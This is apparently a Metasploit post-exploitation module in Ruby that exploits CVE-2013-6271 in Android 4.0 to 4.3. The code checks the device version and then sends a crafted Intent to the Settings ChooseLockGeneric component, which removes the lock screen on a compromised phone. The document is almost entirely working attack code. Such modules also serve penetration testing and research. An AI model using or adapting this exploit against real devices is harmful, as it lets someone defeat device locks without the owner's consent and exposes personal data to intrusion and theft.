##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::Common
  include Msf::Post::Android::System

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android Settings Remove Device Locks (4.0-4.3)",
        'Description'   => %q{
            This module exploits a bug in the Android 4.0 to 4.3 com.android.settings.ChooseLockGeneric class.
            Any unprivileged app can exploit this vulnerability to remove the lockscreen.
            A logic flaw / design error exists in the settings application that allows an Intent from any
            application to clear the screen lock. The user may see that the Settings application has crashed,
            and the phone can then be unlocked by a swipe.
            This vulnerability was patched in Android 4.4.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'CureSec', # discovery
            'timwr'    # metasploit module
        ],
        'References'    =>
        [
            [ 'CVE', '2013-6271' ],
            [ 'URL', 'http://blog.curesec.com/article/blog/26.html' ],
            [ 'URL', 'http://www.curesec.com/data/advisories/Curesec-2013-1011.pdf' ]
        ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'       => 'android',
        'DisclosureDate' => "Oct 11 2013"
      }
    ))
  end

  def is_version_compat?
    build_prop = get_build_prop

    # Sometimes cmd_exec fails to cat build_prop, so the #get_build_prop method returns
    # empty.
    if build_prop.empty?
      fail_with(Failure::Unknown, 'Failed to retrieve build.prop, you might need to try again.')
    end

    android_version = Gem::Version.new(build_prop['ro.build.version.release'])
    if android_version <= Gem::Version.new('4.3') && android_version >= Gem::Version.new('4.0')
      return true
    end

    false
  end

  def run
    unless is_version_compat?
      print_error("This module is only compatible with Android versions 4.0 to 4.3")
      return
    end

    result = session.android.activity_start('intent:#Intent;launchFlags=0x8000;component=com.android.settings/.ChooseLockGeneric;i.lockscreen.password_type=0;B.confirm_credentials=false;end')
    if result.nil?
      print_good("Intent started, the lock screen should now be a dud.")
      print_good("Go ahead and manually swipe or provide any pin/password/pattern to continue.")
    else
      print_error("The Intent could not be started: #{result}")
    end
  end
end

